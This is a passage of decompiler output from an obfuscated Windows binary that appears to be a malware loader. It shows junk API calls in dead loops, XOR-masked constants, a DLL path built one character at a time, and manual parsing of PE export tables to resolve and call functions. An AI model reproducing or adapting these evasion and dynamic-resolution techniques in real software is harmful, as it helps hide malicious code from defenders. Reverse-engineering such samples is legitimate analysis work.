  v27 = -4103;
  v25 = 183096;
  v26 = &v25;
  v1 = (LPVOID)sub_404EC0(a1);
  for ( dword_407FF8 = 0; (unsigned int)dword_407FF8 < 0x12; ++dword_407FF8 )
  {
    if ( dword_407FF8 == 30 )
      v1 = LockResource((HGLOBAL)0x5923);
  }
  v30 = (signed int)v1;
  v31 = -4099;
  v23 = v22 & 0x64;
  do
  {
    if ( dword_407090 )
      break;
    v2 = off_4072D8[3];
    if ( *v2 )
    {
      v3 = sub_4068C5((char *)off_407584, *v2, (int)(off_4072D8 + 20), 1);
      Msg.time = (char *)&dword_407FCC - (char *)&dword_407FF0;
      dword_4074EC = v3;
    }
    if ( dword_4074EC )
    {
      hInst = 0;
      for ( i = -4099; ; i = (v5 + 1) ^ 0x352F )
      {
        if ( __SETP__(i, 33254) )
          v19 = (__PAIR64__((unsigned __int16)v19, i) - 0x5C81000081E6i64) >> 32;
        else
          v14 &= Msg.wParam;
        v18 &= v16;
        if ( *v26 % 0x61u > 0x8A || i == -4147 )
          break;
        stru_40800C.BaudRate = (__PAIR64__(LOWORD(stru_40800C.BaudRate), *v26 / 0x61u) - __PAIR64__(v23, 9518)) >> 32;
        v5 = i ^ 0x352F;
        v30 = 8 * (((i ^ 0x352Fu) + 9518) % ((v27 ^ 0x352Fu) + 9518));
        v6 = stricmp(String1, String2);
        v23 ^= v21;
        v7 = v12;
        if ( v6 )
        {
          sub_4068C5((char *)off_407584, dword_4074EC, (int)&unk_4074F0, 3);
          for ( dword_408028 = 16; dword_408028; --dword_408028 )
          {
            if ( dword_408028 == 25 )
              CreateCursor(hInst, 35991, 32372, 18510, 16173, pvANDPlane, (const void *)0x4307);
          }
        }
        v8 = -4595;
        v28 = -9438;
        do
        {
          if ( v8 == -4568 )
          {
            v11 = *off_4072D8[3];
            stru_40800C.DCBlength = (int)stru_408030.hwnd ^ LOWORD(stru_40800C.DCBlength);
            dword_407514 = ((int (__cdecl *)(int, void *))hInst)(v11, &unk_407638);
          }
          else if ( v8 == -4547 )
          {
            v16 = (__PAIR64__(v16, v7) - __PAIR64__(v15, v5)) >> 32;
            v15 = 64351;
            hInst = (HINSTANCE)sub_4068C5((char *)off_407584, *(_DWORD *)off_40711C, (int)&unk_4071A4, 2);
          }
          if ( __OFSUB__(v17, 34081) )
          {
            v9 = __CFADD__(*(_DWORD *)&stru_40800C.EofChar, v13);
            v13 += stru_40800C.EofChar;
          }
          else
          {
            v9 = 0;
            v21 |= 0x5255u;
          }
          v14 -= v9 + dword_408008;
          v8 = (v28 - 1) ^ 0x352F;
          Msg.hwnd = (HWND)((char *)&dword_408084 + (_DWORD)&dword_40808C - (char *)&dword_407FB0);
          v28 = v8 ^ 0x352F;
          v7 = (v8 ^ 0x352F) + 9518;
        }
        while ( (v8 ^ 0x352F) != -9518 );
        v28 = 8 * (((v31 ^ 0x352Fu) + 9518) % ((v27 ^ 0x352Fu) + 9518));
        sub_404673(v30, v28);
        for ( j = 0; j < 0x1A; ++j )
          ;
      }
    }
    v31 = ((v31 ^ 0x352F) + 1) ^ 0x352F;
  }
  while ( v31 != -4595 );
  return 1;
}
// 4054E3: could not find valid save-restore pair for edi
// 40585F: conditional instruction was optimized away because of '%var_30.4<1Au'
// 40557F: variable 'v22' is possibly undefined
// 40566E: variable 'v21' is possibly undefined
// 405677: variable 'v12' is possibly undefined
// 4056EE: variable 'pvANDPlane' is possibly undefined
// 40575F: variable 'v7' is possibly undefined
// 40575F: variable 'v16' is possibly undefined
// 40575F: variable 'v15' is possibly undefined
// 4057A3: variable 'v17' is possibly undefined
// 4057B1: variable 'v13' is possibly undefined
// 4057DD: variable 'v14' is possibly undefined
// 4058AE: variable 'v19' is possibly undefined
// 4058C1: variable 'v18' is possibly undefined
// 407090: using guessed type int dword_407090;
// 40711C: using guessed type void *off_40711C;
// 4072D8: using guessed type int **off_4072D8;
// 4074EC: using guessed type int dword_4074EC;
// 407514: using guessed type int dword_407514;
// 407FB0: using guessed type int dword_407FB0;
// 407FCC: using guessed type int dword_407FCC;
// 407FF0: using guessed type int dword_407FF0;
// 407FF8: using guessed type int dword_407FF8;
// 408008: using guessed type int dword_408008;
// 408028: using guessed type int dword_408028;
// 408084: using guessed type int dword_408084;
// 40808C: using guessed type int dword_40808C;

//----- (0040590B) --------------------------------------------------------
int __userpurge sub_40590B@<eax>(__int16 a1@<ax>, unsigned __int16 a2)
{
  bool v2; // zf
  int v3; // eax
  HWND hWnd; // [esp+0h] [ebp-10h]

  v2 = a1 == (__int16)a2;
  v3 = -4099;
  if ( v2 )
  {
    dword_408000 = 0;
    do
    {
      if ( ++dword_408000 == 38 )
        OpenIcon(hWnd);
    }
    while ( (unsigned int)dword_408000 < 0x16 );
    v3 = -4100;
  }
  return (v3 ^ 0x352F) + 9518;
}
// 405950: variable 'hWnd' is possibly undefined
// 408000: using guessed type int dword_408000;

//----- (00405974) --------------------------------------------------------
int __userpurge sub_405974@<eax>(char a1@<al>, unsigned __int8 a2)
{
  bool v2; // zf
  int v3; // eax
  int i; // [esp+0h] [ebp-Ch]

  v2 = a1 == (char)a2;
  v3 = -4099;
  if ( v2 )
  {
    for ( i = 26; i; --i )
    {
      if ( i == 28 )
        AreFileApisANSI();
    }
    v3 = -4100;
  }
  return (v3 ^ 0x352F) + 9518;
}

//----- (004059DC) --------------------------------------------------------
int __userpurge sub_4059DC@<eax>(int a1@<edi>, unsigned int a2@<esi>, _DWORD *a3, unsigned int *a4, _DWORD *a5, _DWORD *a6, _DWORD *a7, _DWORD *a8, _DWORD *a9, unsigned int *a10)
{
  unsigned int i; // ebx
  int v11; // eax
  unsigned int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // eax
  unsigned int *v15; // ecx
  int v16; // eax
  int v17; // eax
  int result; // eax
  int v19; // [esp+28h] [ebp-38h]
  unsigned int v20; // [esp+2Ch] [ebp-34h]
  int j; // [esp+34h] [ebp-2Ch]
  HWND nIndex; // [esp+38h] [ebp-28h]

  for ( i = -4099; i != -4147; i = ((i ^ 0x352F) + 1) ^ 0x352F )
  {
    for ( dword_408084 = 0; (unsigned int)dword_408084 < 0x1D; ++dword_408084 )
    {
      if ( dword_408084 == 38 )
        SetClassLongW(nIndex, (int)nIndex, 13037);
    }
    if ( i % 0x43 == 118 || i == -4104 )
    {
      v17 = *(_DWORD *)(*(_DWORD *)a2 + 32);
      *a3 = a1 + *(_DWORD *)(*(_DWORD *)a2 + 28);
      for ( j = 23; j; --j )
      {
        if ( j == 24 )
          v17 = wvsprintfA(aDrp4J754w9ynw, aEow5178p9euk9, (va_list)0x499D);
      }
      v15 = a4;
      v14 = a1 + v17;
      goto LABEL_26;
    }
    j += v19 + (dword_407FF8 < a2);
    if ( i % 0x76 >= 0x98 || i == -4102 )
    {
      v16 = a1 + *(_DWORD *)(a1 + 60);
      *a5 = v16;
      *(_DWORD *)a2 = a1 + *(_DWORD *)(v16 + 120);
      goto LABEL_27;
    }
    if ( i % 0x65 > 0x896 || i == -4108 )
    {
      *a6 = -4103;
      *a7 = -4103;
      *a8 = -4101;
      goto LABEL_27;
    }
    if ( i % 0x87 == 259 || i == -4106 )
    {
      v11 = *(_DWORD *)a2;
      v12 = *(_DWORD *)(*(_DWORD *)a2 + 36);
      v20 = (__PAIR64__(v20, v12) - __PAIR64__(dword_408060, dword_408050)) >> 32;
      *a9 = a1 + v12;
      v13 = *(_DWORD *)(v11 + 20);
      v14 = *(_DWORD *)(v11 + 24);
      if ( v13 > v14 )
        v14 = v13;
      v15 = a10;
LABEL_26:
      *v15 = v14;
    }
LABEL_27:
    result = 13615;
  }
  return result;
}
// 405A26: variable 'nIndex' is possibly undefined
// 405ABE: variable 'v19' is possibly undefined
// 405ABC: variable 'j' is possibly undefined
// 405B30: variable 'v20' is possibly undefined
// 407FF8: using guessed type int dword_407FF8;
// 408050: using guessed type int dword_408050;
// 408060: using guessed type int dword_408060;
// 408064: using guessed type int dword_408064;
// 408084: using guessed type int dword_408084;
// 40819E: using guessed type int *off_40819E[7];

//----- (00405C2A) --------------------------------------------------------
int __userpurge start@<eax>(unsigned int a1@<ebx>, unsigned int a2@<edi>, unsigned int a3@<esi>, int a4)
{
  WCHAR v5; // ax
  WCHAR v6; // cx
  WCHAR v7; // dx
  DWORD v8; // eax
  unsigned __int16 v9; // [esp+Ch] [ebp-3F8h]
  unsigned __int16 v10; // [esp+60h] [ebp-3A4h]
  unsigned int v11; // [esp+BCh] [ebp-348h]
  int v12; // [esp+C8h] [ebp-33Ch]
  unsigned __int8 v13; // [esp+FCh] [ebp-308h]
  unsigned int v14; // [esp+144h] [ebp-2C0h]
  unsigned int v15; // [esp+14Ch] [ebp-2B8h]
  int v16; // [esp+174h] [ebp-290h]
  int v17; // [esp+1B8h] [ebp-24Ch]
  WCHAR pszPath[28]; // [esp+1ECh] [ebp-218h] BYREF
  BOOL v19[116]; // [esp+224h] [ebp-1E0h] BYREF
  unsigned int v20; // [esp+3F4h] [ebp-10h] BYREF
  HWND v21; // [esp+3F8h] [ebp-Ch] BYREF
  unsigned int v22; // [esp+3FCh] [ebp-8h] BYREF
  void **v23; // [esp+400h] [ebp-4h] BYREF
  int savedregs; // [esp+404h] [ebp+0h] BYREF
  void *retaddr; // [esp+408h] [ebp+4h] BYREF

  if ( StrSpnA(psz, pszSet) > 10 )
    return 0;
  *(_DWORD *)&stru_40800C.wReserved = 0;
  do
  {
    if ( ++*(_DWORD *)&stru_40800C.wReserved == 27 )
      CreateCaret((HWND)v19[114], (HBITMAP)0x6C81, 9634, 15191);
  }
  while ( *(_DWORD *)&stru_40800C.wReserved < 0x16u );
  sub_40417E((int)&savedregs, 0xFFFFEFFD, &v20);
  dword_408000 |= v16;
  pszPath[0] = 70;
  pszPath[1] = 58;
  pszPath[2] = 92;
  pszPath[3] = 92;
  *(_DWORD *)off_40813A ^= dword_408088;
  v5 = 74;
  if ( v15 <= 0xE5B )
    v12 ^= v11;
  pszPath[4] = 74;
  v6 = 72;
  pszPath[5] = 72;
  pszPath[6] = 68;
  v7 = 75;
  pszPath[7] = 75;
  pszPath[8] = 74;
  pszPath[9] = 72;
  dword_408054 = (unsigned int)&stru_40800C.BaudRate | (unsigned int)&dword_408004;
  pszPath[10] = 74;
  pszPath[11] = 75;
  pszPath[14] = 92;
  pszPath[12] = 72;
  for ( dword_408050 = 0; (unsigned int)dword_408050 < 0x15; ++dword_408050 )
  {
    if ( dword_408050 == 23 )
      v5 = GetMessageW(&stru_408030, v21, (UINT)v21, v19[114]);
  }
  pszPath[15] = 68;
  pszPath[16] = v5;
  pszPath[21] = v5;
  pszPath[17] = v7;
  dword_407FC4 |= v9;
  pszPath[23] = 46;
  pszPath[24] = 68;
  pszPath[25] = 76;
  pszPath[26] = 76;
  pszPath[27] = 0;
  pszPath[18] = v5;
  dword_40805C += *off_40819A[0] + (v11 < 0x5C);
  pszPath[13] = 92;
  pszPath[19] = v6;
  pszPath[20] = v7;
  pszPath[22] = v6;
  memset(v19, 0, sizeof(v19));
  if ( PathMakePrettyW(pszPath) )
  {
    if ( sub_40422E((unsigned int)&v21, (LONG *)&v22) - 13960 < 0 )
      stru_40800C.DCBlength = stru_40800C.DCBlength & 0x558D;
    *(_DWORD *)&DCB[8] -= v12;
    sub_40422E(0, &dword_407548);
    sub_40417E((int)&savedregs, 0, (unsigned int *)&dword_40754C);
    sub_40422E(0, &dword_407550);
    sub_40422E(0, &dword_407554);
  }
  for ( dword_407FF8 = 0; (unsigned int)dword_407FF8 < 0x16; ++dword_407FF8 )
  {
    if ( dword_407FF8 == 24 )
      LookupIconIdFromDirectory((PBYTE)0x6AB0, v19[112]);
  }
  v23 = &retaddr;
  sub_40422E(0x6586476u, (LONG *)&v23);
  *(_BYTE *)off_40814E[0] += 47;
  v23 = (void **)&savedregs;
  sub_403AD0(&savedregs);
  sub_40422E(dword_407548, &dword_4074CC);
  sub_40417E((int)&savedregs, dword_40754C, (unsigned int *)&dword_4074D0);
  *off_40812A[0] += v10 + (Msg.message < sub_40422E(dword_407550, (LONG *)&unk_4074D4));
  sub_40422E(v22, &dword_4074D8);
  v8 = GetCurrentProcessId();
  dword_408074 -= v17;
  if ( v8 )
  {
    sub_4050E5(a1, a2);
  }
  else if ( GetCurrentThreadId() )
  {
    ExitProcess(0);
  }
  dword_40802C = (__PAIR64__(dword_40802C, v14) - __PAIR64__(v13, a3)) >> 32;
  *(_DWORD *)v22 = *(_DWORD *)dword_4074D8;
  dword_407100 ^= dword_407104;
  *(_DWORD *)dword_407554 += dword_407100;
  return *(_DWORD *)v22;
}
// 405C2A: could not find valid save-restore pair for edi
// 405C2A: could not find valid save-restore pair for esi
// 405CD5: variable 'v16' is possibly undefined
// 405D35: variable 'v15' is possibly undefined
// 405D57: variable 'v11' is possibly undefined
// 405D57: variable 'v12' is possibly undefined
// 405ED3: variable 'v7' is possibly undefined
// 405EDC: variable 'v9' is possibly undefined
// 405F47: variable 'v6' is possibly undefined
// 4060E7: variable 'v10' is possibly undefined
// 406112: variable 'v17' is possibly undefined
// 406137: variable 'v14' is possibly undefined
// 40612F: variable 'v13' is possibly undefined
// 407100: using guessed type int dword_407100;
// 407104: using guessed type int dword_407104;
// 4074CC: using guessed type int dword_4074CC;
// 4074D0: using guessed type int dword_4074D0;
// 4074D8: using guessed type int dword_4074D8;
// 407548: using guessed type int dword_407548;
// 40754C: using guessed type int dword_40754C;
// 407550: using guessed type int dword_407550;
// 407554: using guessed type int dword_407554;
// 407FAC: using guessed type int dword_407FAC;
// 407FC4: using guessed type int dword_407FC4;
// 407FF8: using guessed type int dword_407FF8;
// 408000: using guessed type int dword_408000;
// 408004: using guessed type int dword_408004;
// 40802C: using guessed type int dword_40802C;
// 408050: using guessed type int dword_408050;
// 408054: using guessed type int dword_408054;
// 40805C: using guessed type int dword_40805C;
// 408074: using guessed type int dword_408074;
// 408088: using guessed type int dword_408088;
// 4080DE: using guessed type int *off_4080DE[7];
// 40812A: using guessed type int *off_40812A[2];
// 40813A: using guessed type void *off_40813A;
// 40814E: using guessed type int *off_40814E[2];
// 40819A: using guessed type int *off_40819A[8];

//----- (00406191) --------------------------------------------------------
void __stdcall cyflorvyce_a_LBPMgm__(int a1, char a2)
{
  *(_DWORD *)off_4081C2 &= dword_408068;
  *(_DWORD *)Buffer -= dword_407FC8;
  Msg.wParam = dword_407FB0 + LOWORD(Msg.wParam);
}
// 407FB0: using guessed type int dword_407FB0;
// 407FC8: using guessed type int dword_407FC8;
// 408068: using guessed type int dword_408068;
// 4081C2: using guessed type void *off_4081C2;

//----- (004061DE) --------------------------------------------------------
int __userpurge sub_4061DE@<eax>(unsigned int a1@<ebx>, int a2, int a3, int *a4)
{
  int v4; // eax
  unsigned int v5; // ecx
  unsigned int v7; // edx
  unsigned __int16 v8; // ax
  __int16 v10; // ax
  int v11; // eax
  int v12; // eax
  int result; // eax
  unsigned __int16 v14; // [esp-10h] [ebp-11Ch]
  unsigned int v16; // [esp+40h] [ebp-CCh]
  unsigned int v17; // [esp+44h] [ebp-C8h]
  unsigned int v18; // [esp+58h] [ebp-B4h]
  unsigned __int8 v19; // [esp+5Ch] [ebp-B0h]
  int v20; // [esp+70h] [ebp-9Ch]
  int v21; // [esp+78h] [ebp-94h]
  int v22; // [esp+7Ch] [ebp-90h]
  int v23; // [esp+84h] [ebp-88h]
  int v24; // [esp+98h] [ebp-74h]
  unsigned int v25; // [esp+A8h] [ebp-64h]
  int v26; // [esp+B0h] [ebp-5Ch]
  int v27; // [esp+B8h] [ebp-54h]
  int v28; // [esp+C4h] [ebp-48h]
  unsigned __int8 v29; // [esp+DCh] [ebp-30h]
  UINT cEntries; // [esp+E4h] [ebp-28h]
  __int16 v31; // [esp+E8h] [ebp-24h]
  UINT iStart; // [esp+ECh] [ebp-20h]
  int v33; // [esp+F0h] [ebp-1Ch]
  int v34; // [esp+F4h] [ebp-18h]
  int v35; // [esp+F8h] [ebp-14h]
  int v36; // [esp+104h] [ebp-8h]
  int v37; // [esp+108h] [ebp-4h]
  int v38; // [esp+108h] [ebp-4h]
  int v39; // [esp+108h] [ebp-4h]
  int v40; // [esp+108h] [ebp-4h]
  int v41; // [esp+108h] [ebp-4h]
  int v42; // [esp+114h] [ebp+8h]

  v4 = -4100;
  v37 = 108356888;
  for ( *(_DWORD *)DCB = 26; *(_DWORD *)DCB; --*(_DWORD *)DCB )
  {
    if ( *(_DWORD *)DCB == 41 )
      v4 = RemoveDirectoryA(aAhc84mz3gpw);
  }
  v31 = -4099;
  dword_40807C = v26 ^ (unsigned __int8)dword_40807C;
  v5 = 13615;
  v35 = -1;
  iStart = v4;
  v7 = 9518;
  v36 = 1;
  while ( 1 )
  {
    *(_BYTE *)off_4080CE[25] += 11;
    v34 = -11356;
    v38 = 3287866 * (v37 | 0x651516) + 2385255;
    if ( (int)(v7 - 16429) >= 0 )
      v24 -= *off_408182[0];
    else
      v24 -= dword_40808C;
    *(_DWORD *)&stru_40800C.EofChar = v23 ^ *(unsigned __int16 *)&stru_40800C.EofChar;
    v35 += (v5 ^ 0xFFFFEFFC) + 9518;
    v20 ^= v19;
    v8 = (*(_WORD *)(a2 + 32) ^ 0x32F) + 558;
    _EBX = dword_407FF0;
    __asm { rcr     ebx, 2 }
    dword_407FF0 = _EBX;
    if ( v7 + (v5 ^ 0xFFFFEFFC) <= v8 )
    {
      v33 = -9518;
      do
      {
        Msg.wParam += v22 + (v25 < v7);
        v42 = v33 + 9518;
        *off_4080E6[0] &= v29;
        for ( cEntries = 0; cEntries < 0x17; ++cEntries )
          ;
        if ( (unsigned __int16)((*(_WORD *)(a2 + 4 * (v33 + 9518) + 2) ^ 0x32F) + 558) == v35 )
        {
          v36 *= v7 + (v5 ^ 0xFFFFEFFC);
          if ( sub_40590B(*(_WORD *)(a2 + 4 * v42), 0xFEFDu) )
          {
            v28 ^= v27;
            v21 ^= *(_DWORD *)off_4081C2;
            dword_408078 += (int)&stru_408030.wParam;
            dword_408078 |= (unsigned int)&dword_408090;
            dword_408078 += (int)&Msg.message;
            if ( sub_405974(*(_BYTE *)(v35 * (v7 + (v5 ^ iStart)) + a3), 0) )
              goto LABEL_26;
          }
          *(_BYTE *)off_40810E += 9;
          v10 = *(unsigned __int8 *)(v35 * (v7 + (v5 ^ iStart)) + a3);
          *(_DWORD *)&stru_40800C.EofChar ^= (unsigned int)&stru_408030.lParam;
          *(_DWORD *)&stru_40800C.EofChar -= &dword_408054;
          v14 = (v10 - 558) ^ 0x32F;
          stru_408030.lParam = 0;
          do
          {
            if ( ++stru_408030.lParam == 40 )
              SetPaletteEntries((HPALETTE)0x208F, iStart, cEntries, (const PALETTEENTRY *)0xFFFFEFFC);
          }
          while ( stru_408030.lParam < 0x1Cu );
          if ( sub_40590B(*(_WORD *)(a2 + 4 * v42), v14) )
          {
LABEL_26:
            v34 = -10356;
            *(_DWORD *)Buffer = (unsigned int)&dword_407FC0 | (unsigned int)&Msg.time;
            v31 = v5 ^ ((v5 ^ v31) + (v5 ^ 0xEFFC) + 9518);
            break;
          }
          v34 = -5228;
        }
        v18 += dword_40805C + (v5 < dword_408078);
        v33 += (v5 ^ 0xFFFFEFFC) + 9518;
      }
      while ( (v5 ^ 0xFFFFEFFC) + v33 + 19036 <= (unsigned __int16)((*(_WORD *)(a2 + 32) ^ 0x32F) + 558) );
    }
    v39 = v38 ^ 0x47516;
    if ( v18 < 0x302D )
      *(_BYTE *)off_4081B2[0] -= (v18 < 0x302D) + 63;
    else
      v20 ^= dword_407FF4;
    *(_BYTE *)off_40815E |= 4u;
    if ( (v5 ^ (*(unsigned __int8 *)(v35 * (v7 + (v5 ^ iStart)) + a3) - v7)) == -4099 )
      break;
    v40 = v39 + 332809;
    if ( v34 == -5228 )
    {
      if ( a2 == 19620 )
        *(_BYTE *)off_408122[0] |= 0x10u;
      dword_408008 = __ROR4__(dword_408008, 1);
      v36 += -9518 - (v5 ^ 0xFFFFEFFC);
      v41 = v40 - 145466;
    }
    else
    {
      *(_DWORD *)&stru_40800C.wReserved = (__PAIR64__(*(unsigned int *)&stru_40800C.wReserved, dword_408070)
                                         - __PAIR64__(v17, 815)) >> 32;
      v36 += -9518 - (v5 ^ 0xFFFFEFFD);
      v41 = 480870 * (v40 & 0x2CA09);
    }
    if ( v36 == v7 + (v5 ^ 0xFFFFEFFD) )
    {
      Msg.hwnd = (HWND)(dword_408058 + (610678 * (v41 | 0x2CA0Au) < dword_407FB4) + LOWORD(Msg.hwnd));
      goto LABEL_45;
    }
    v37 = v41 + 2308648;
  }
  for ( dword_407FAC = 0; (unsigned int)dword_407FAC < 0x1D; ++dword_407FAC )
  {
    if ( dword_407FAC == 31 )
      GetCommState((HANDLE)0x3A05, &stru_40800C);
  }
  v36 += (v5 ^ 0xFFFFEFFD) + 9518;
LABEL_45:
  if ( ((unsigned __int16)((v5 ^ v31) + 8960) ^ 0x32F) == *(_WORD *)(a2 + 32)
    || (v11 = -4100, v36 == v7 + (v5 ^ 0xFFFFEFFD)) )
  {
    v11 = -4099;
  }
  v12 = v5 ^ v11;
  dword_407FCC = (__PAIR64__((unsigned __int8)dword_407FCC, a1) - __PAIR64__(v16, -9518 - v12)) >> 32;
  result = v36 + -9518 - v12;
  *a4 = result;
  return result;
}
// 4061DE: could not find valid save-restore pair for ebx
// 406443: conditional instruction was optimized away because of '%cEntries.4<17u'
// 406291: variable 'v26' is possibly undefined
// 406333: variable 'v7' is possibly undefined
// 40634A: variable 'v24' is possibly undefined
// 406373: variable 'v23' is possibly undefined
// 40637E: variable 'v5' is possibly undefined
// 40639F: variable 'v19' is possibly undefined
// 4063A7: variable 'v20' is possibly undefined
// 4063F2: variable 'v22' is possibly undefined
// 4063E2: variable 'v25' is possibly undefined
// 406406: variable 'v29' is possibly undefined
// 4064C6: variable 'v27' is possibly undefined
// 4064C6: variable 'v28' is possibly undefined
// 4064DD: variable 'v21' is possibly undefined
// 4065D3: variable 'v18' is possibly undefined
// 406717: variable 'v17' is possibly undefined
// 4068A7: variable 'v16' is possibly undefined
// 407FAC: using guessed type int dword_407FAC;
// 407FB4: using guessed type int dword_407FB4;
// 407FC0: using guessed type int dword_407FC0;
// 407FCC: using guessed type int dword_407FCC;
// 407FF0: using guessed type int dword_407FF0;
// 407FF4: using guessed type int dword_407FF4;
// 408008: using guessed type int dword_408008;
// 408054: using guessed type int dword_408054;
// 408058: using guessed type int dword_408058;
// 40805C: using guessed type int dword_40805C;
// 408070: using guessed type int dword_408070;
// 408078: using guessed type int dword_408078;
// 40807C: using guessed type int dword_40807C;
// 40808C: using guessed type int dword_40808C;
// 408090: using guessed type int dword_408090;
// 4080CE: using guessed type int *off_4080CE[11];
// 4080E6: using guessed type int *off_4080E6[5];
// 40810E: using guessed type void *off_40810E;
// 408122: using guessed type int *off_408122[4];
// 40815E: using guessed type void *off_40815E;
// 408182: using guessed type int *off_408182[14];
// 4081B2: using guessed type int *off_4081B2[2];
// 4081C2: using guessed type void *off_4081C2;

//----- (004068C5) --------------------------------------------------------
int __cdecl sub_4068C5(char *a1, int a2, int a3, int a4)
{
  char *v4; // eax
  unsigned int v5; // ecx
  int v6; // edx
  unsigned int v7; // ecx
  int v8; // eax
  int v9; // esi
  _BYTE *v10; // eax
  int v11; // ecx
  int v12; // edx
  int *v13; // eax
  int v14; // ebx
  bool v15; // cf
  _BYTE v17[116]; // [esp+0h] [ebp-1C0h] BYREF
  int v18; // [esp+74h] [ebp-14Ch]
  int v19; // [esp+90h] [ebp-130h]
  unsigned int v20; // [esp+9Ch] [ebp-124h]
  unsigned int v21; // [esp+A8h] [ebp-118h]
  int v22; // [esp+124h] [ebp-9Ch]
  int v23; // [esp+134h] [ebp-8Ch]
  int v24; // [esp+138h] [ebp-88h]
  int v25; // [esp+144h] [ebp-7Ch]
  int v26; // [esp+14Ch] [ebp-74h]
  int v27; // [esp+154h] [ebp-6Ch]
  WPARAM v28; // [esp+158h] [ebp-68h]
  unsigned int v29; // [esp+15Ch] [ebp-64h]
  int *v30; // [esp+160h] [ebp-60h]
  int *v31; // [esp+164h] [ebp-5Ch]
  int *v32; // [esp+168h] [ebp-58h]
  int *v33; // [esp+16Ch] [ebp-54h]
  int v34; // [esp+170h] [ebp-50h] BYREF
  int v35; // [esp+174h] [ebp-4Ch] BYREF
  int v36; // [esp+178h] [ebp-48h] BYREF
  int v37; // [esp+17Ch] [ebp-44h] BYREF
  int v38; // [esp+180h] [ebp-40h] BYREF
  unsigned int v39; // [esp+184h] [ebp-3Ch] BYREF
  int (__thiscall *v40)(unsigned int); // [esp+188h] [ebp-38h]
  unsigned int v41; // [esp+18Ch] [ebp-34h] BYREF
  int v42; // [esp+190h] [ebp-30h] BYREF
  unsigned int v43; // [esp+194h] [ebp-2Ch] BYREF
  int v44; // [esp+198h] [ebp-28h] BYREF
  int v45; // [esp+19Ch] [ebp-24h] BYREF
  LPFINDREPLACEW v46; // [esp+1A0h] [ebp-20h] BYREF
  int v47; // [esp+1A4h] [ebp-1Ch] BYREF
  int v48; // [esp+1A8h] [ebp-18h]
  int v49; // [esp+1ACh] [ebp-14h]
  _BYTE *v50; // [esp+1B0h] [ebp-10h]
  int i; // [esp+1B4h] [ebp-Ch]
  _BYTE *v52; // [esp+1B8h] [ebp-8h]
  int v53; // [esp+1BCh] [ebp-4h] BYREF
  int savedregs; // [esp+1C0h] [ebp+0h] BYREF
  char *v55; // [esp+1C8h] [ebp+8h]

  v34 = 11015;
  v35 = 30006;
  v36 = 549991;
  v37 = 18023;
  v30 = &v34;
  v31 = &v35;
  v32 = &v36;
  v33 = &v37;
  v4 = a1;
  v49 = -4100;
  v48 = -4099;
  for ( i = -4099; ; i = (int)v4 )
  {
    if ( v48 == -4099 )
    {
      v29 = 0;
      do
      {
        if ( ++v29 == 40 )
          v4 = (char *)GetWindowsDirectoryA(DCB, 0x5083u);
      }
      while ( v29 < 0x1B );
      dword_407FAC += v23 + (v4 < (char *)&savedregs);
      sub_4059DC(a2, (unsigned int)&v47, &v39, &v41, &v38, &v44, &v45, &v42, &v46, &v43);
    }
    if ( v45 != -4099 && (!*(_DWORD *)(v47 + 24) || !*(_DWORD *)(v47 + 20)) )
    {
      v49 = -4099;
      goto LABEL_25;
    }
    if ( v44 == -4099 )
      return 0;
    v22 = 1;
    v25 = dword_407FA8 ^ (unsigned __int8)v25;
    if ( i == ((v43 - 9518) ^ 0x352F) || v49 != -4100 )
      return 0;
    v19 = (unsigned __int16)v19 << 14;
    v5 = (i ^ 0x352F) + 9518;
    if ( v5 >= 5 )
      v48 = -4100;
    v18 += *off_4080DE[0];
    v55 = a1 + 30010;
    if ( v5 >= *(_DWORD *)(v47 + 24)
      || *((unsigned __int16 *)&v46->lStructSize + v5) > (unsigned int)(*(_DWORD *)(v47 + 20) - 1) )
    {
      return 0;
    }
    *off_408122[0] += *(_DWORD *)&DCB[8];
    a1 = v55 - 30010;
    v6 = v42;
    for ( dword_408088 = 23; dword_408088; --dword_408088 )
    {
      if ( dword_408088 == 35 )
        ReplaceTextW(v46);
    }
    v53 = 0;
    v40 = (int (__thiscall *)(unsigned int))*(unsigned __int16 *)((char *)&v46->lStructSize + v5
                                                                                            * ((v6 ^ 0x352F) + 9518));
    Msg.message += (UINT)&Msg;
    Msg.message |= (unsigned int)&dword_407FF8;
    ((void (__stdcall *)(int, int, int *))a1)(a3, a2 + *(_DWORD *)(v5 * ((v45 ^ 0x352F) + 9518) + v41), &v53);
    if ( v53 == 1 )
      break;
LABEL_25:
    v26 = 58830584;
    v4 = (char *)(((i ^ 0x352F) + 1) ^ 0x352F);
  }
  v7 = v39;
  v8 = *(_DWORD *)(v39 + 4 * (_DWORD)v40);
  dword_40807C ^= (unsigned int)&stru_40800C.wReserved;
  dword_40807C += (int)&unk_408094;
  v40 = (int (__thiscall *)(unsigned int))(a2 + v8);
  v52 = 0;
  if ( a4 )
  {
    v50 = 0;
    v9 = (v44 ^ 0x352F) + 9518;
    *(_BYTE *)off_4080CE[36] -= 26;
    v38 = a4 * v9;
    v52 = v17;
    v10 = v17;
    v28 = stru_408030.wParam + (unsigned __int8)v28;
    v11 = a4 * v9;
    do
    {
      dword_40805C = (int)&dword_407FB0 + ((unsigned int)&dword_407FF0 & (unsigned int)&DCB[4]);
      --v10;
      --v11;
    }
    while ( v11 );
    v50 = v10;
    v12 = a4;
    v7 = 0;
    dword_408000 -= 24211;
    v13 = &a4;
    do
    {
      v14 = (int)v50;
      ++v13;
      *(_BYTE *)off_4080CE[17] += 100;
      *(_DWORD *)(v7 + v14) = *v13;
      v7 += v9;
      --v12;
    }
    while ( v12 );
  }
  else
  {
    stru_408030.message = 0;
    do
    {
      if ( ++stru_408030.message == 19 )
        ChooseColorW((LPCHOOSECOLORW)v46);
    }
    while ( stru_408030.message < 0x12 );
    if ( v7 >= 0x6579 )
    {
      v15 = (unsigned __int8)v21 < v20;
      v21 = (unsigned __int8)v21 - v20;
    }
    else
    {
      v15 = 0;
      v24 ^= 0x4DB4u;
    }
    v27 -= v15 + Msg.pt.x;
    v52 = 0;
  }
  return v40(v7);
}
// 406AF4: variable 'v5' is possibly undefined
// 406AEB: variable 'v6' is possibly undefined
// 406CAE: variable 'v7' is possibly undefined
// 407FA8: using guessed type int dword_407FA8;
// 407FAC: using guessed type int dword_407FAC;
// 407FB0: using guessed type int dword_407FB0;
// 407FF0: using guessed type int dword_407FF0;
// 407FF8: using guessed type int dword_407FF8;
// 408000: using guessed type int dword_408000;
// 40805C: using guessed type int dword_40805C;
// 408068: using guessed type int dword_408068;
// 408070: using guessed type int dword_408070;
// 40807C: using guessed type int dword_40807C;
// 408088: using guessed type int dword_408088;
// 4080CE: using guessed type int *off_4080CE[11];
